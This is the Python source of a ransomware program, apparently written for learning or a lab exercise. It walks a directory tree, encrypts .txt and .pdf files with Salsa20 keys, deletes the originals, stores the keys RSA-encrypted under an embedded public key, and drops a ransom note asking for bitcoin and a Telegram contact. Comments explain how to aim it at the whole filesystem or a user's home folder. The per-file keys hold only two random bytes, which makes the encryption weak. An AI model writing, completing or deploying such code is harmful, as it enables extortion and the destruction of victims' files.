import os
import base64

import Crypto
from Crypto.Cipher import Salsa20
from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import PKCS1_OAEP

masterkey = RSA.importKey(base64.b64decode(b"LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUEyb3FkTDUzR2dKc3hKaEJ3TFdObQp0R0lLS1lqK3g2THNuL3pHeVJhVzlFTmNaa3pNSS81bDA2V0NCZXk3cEhMQmJBdUNFUkVHL1pxV1dxanBOZlQvCmNZdDNBR1pidjFKQUZuZVdTeC94d3pjRDdYbDBXYmwrTVNsbHdaUDJWUmZxWUkzOFJHb29zS0hQWXBBNVAva0MKNmNnOE5ENHo1eExnajF6a3c0Q3FOb3ZJU2EwSm8vY3VlN2JZdlJUYnJuVDV6SE9PZ1NaVmV0bHN4TlhPSlprbgozUGIzQ014bFRobTgvNzYxRUUzNmFRbXJQM29RT2Z3ME5ub2VHckFmWFQ4TUtMcS92clpDNDBHa0NYdmRxN3NUCkU0SEpWUEtsWHpsSkxwbGxGTjVNK0VEOC9nMjVwcVdYVkRoYkxTU3p5N3d2N3lQalJRT1FPUG12N252QzYycjUKT1FJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"))
# fs_root = "/" - if the user is root, encrypt the whole compuer
# fs_root = os.path.expanduser("~") - if the user doesn;t have root priviledges, only encrypt files from his home folder
fs_root = os.path.join(os.path.expanduser("~"), "test") # for tesing only
file_extensions = [".txt", ".pdf"]

def alreadyEncrypted():
	global fs_root
	return os.path.isfile(os.path.join(fs_root, "info.bcrypt"))

def writeInfo(salsakeys):
	global fs_root
	global masterkey
	global file_extensions
	cipher = PKCS1_OAEP.new(masterkey)

	f = open(os.path.join(fs_root, "info.bcrypt"), "w")
	f.write("INFO\n")
	f.write("----\n\n")
	f.write("Encrypted RSA public key: {}".format(base64.b64encode(masterkey.exportKey('PEM')).decode()))
	f.write("\nEncrypted file-specific keys:\n")
	for i in range(len(salsakeys)):
		fe = file_extensions[i]
		sk = salsakeys[i]
		dec = fe.encode() + b"." + sk
		enc = cipher.encrypt(dec)
		f.write(base64.b64encode(enc).decode() + '\n')
	f.close()


def getFiles(dir, ext=".txt"):
	fs = os.listdir(dir)
	files = list()
	for f in fs:
		path = os.path.join(dir, f)
		if os.path.isdir(path):
			files = files + getFiles(path, ext)
		else:
			if path.endswith(ext):
				files.append(path)
	return files


def encryptFile(file, key):
	try:
		print("Encrypting {}...".format(file))
		plaintext = open(file, 'rb').read()
		cipher = Salsa20.new(key=key)
		msg = cipher.nonce + cipher.encrypt(plaintext)
		open("{}.enc".format(file), "wb").write(msg)
		os.remove(file)
	except:
		print("Could not encrypt {}!".format(file))


def encryptFileExtension(ext, key):
	global fs_root
	files = getFiles(fs_root, ext)
	for file in files:
		encryptFile(file, key)


def ransomNote():
	home = os.path.expanduser("~")
	desktop = os.path.join(home, "Desktop")
	filename = "OPEN_ME.txt"
	msg = "Hi!\nAll your files have been encrypted.\nPlease transfer 1 bitcoint to XXXXXXXXX.\nIf you don;t know how, just sesrch it on the internet.\nAfter the payment is at least 10 blocks old, pleas contact @HAXXmaster1337 on Telegram to receive the decryption software."
	open(os.path.join(desktop,filename), "w").write(msg)
	print("Ransom note written")


def main():
	global fs_root
	global file_extensions
	global masterkey
	if alreadyEncrypted():
		print("'{}info.bcrypt' already exists! Exiting...".format(fs_root))
		return

	# Generate keys
	print("Generating new keys...")
	salsakeys = []
	for ext in file_extensions:
		salsakey = Random.new().read(2) + 30 * b'/x00'
		salsakeys.append(salsakey)

	print("Writing info.bcrypt...")
	writeInfo(salsakeys)

	# Encrypt all files that have the specified file extension
	for i in range(len(file_extensions)):
		fe = file_extensions[i]
		sk = salsakeys[i]
		encryptFileExtension(fe, sk)

	# Leave ransom note
	ransomNote()

	print("Done. Have a nice day!")


if __name__ == "__main__":
	main()
